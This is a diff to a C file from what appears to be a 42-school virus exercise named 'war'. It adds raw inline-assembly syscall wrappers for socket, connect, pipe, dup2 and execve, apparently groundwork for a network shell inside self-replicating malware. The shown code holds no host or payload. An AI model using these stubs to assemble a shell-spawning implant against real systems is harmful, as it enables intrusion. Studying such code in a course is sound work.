@@ -6,11 +6,68 @@
 /*   By: xxxxxxx <xxxxxxx@42.fr>                    +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2026/01/19 16:16:45 by xxxxxxx           #+#    #+#             */
-/*   Updated: 2026/03/11 14:40:25 by xxxxxxx          ###   ########.fr       */
+/*   Updated: 2026/04/08 16:31:44 by xxxxxxx          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 #include "war.h"
+
+static int ft_socket(int domain, int type, int protocol)
+{
+	asm volatile("movq $41, %rax\n\t"
+				 "syscall\n\t"
+				 "ret\n\t");
+	return 0;
+}
+
+static int ft_connect(int sockfd, void *addr, size_t addrlen)
+{
+	asm volatile("movq $42, %rax\n\t"
+				 "syscall\n\t"
+				 "ret\n\t");
+	return 0;
+}
+
+int ft_shutdown(int sockfd, int how)
+{
+	asm volatile("movq $48, %rax\n\t"
+				 "syscall\n\t"
+				 "ret\n\t");
+	return 0;
+}
+
+int ft_poll(struct pollfd *fds, nfds_t nfds, int timeout)
+{
+	asm volatile("movq $7, %rax\n\t"
+				 "syscall\n\t"
+				 "ret\n\t");
+	return 0;
+}
+
+int ft_pipe(int fds[2])
+{
+
+	asm volatile("movq $22, %rax\n\t"
+				 "syscall\n\t"
+				 "ret\n\t");
+	return 0;
+}
+
+int ft_dup2(int fd, int fd2)
+{
+	asm volatile("movq $33, %rax\n\t"
+				 "syscall\n\t"
+				 "ret\n\t");
+	return 0;
+}
+
+int ft_execve(const char *filename, char *const argv[], char *const envp[])
+{
+	asm volatile("movq $59, %rax\n\t"
+				 "syscall\n\t"
+				 "ret\n\t");
+	return 0;
+}
 
 static int readlinksyscall(const char *pathname, char *buf, size_t bufsiz)
 {
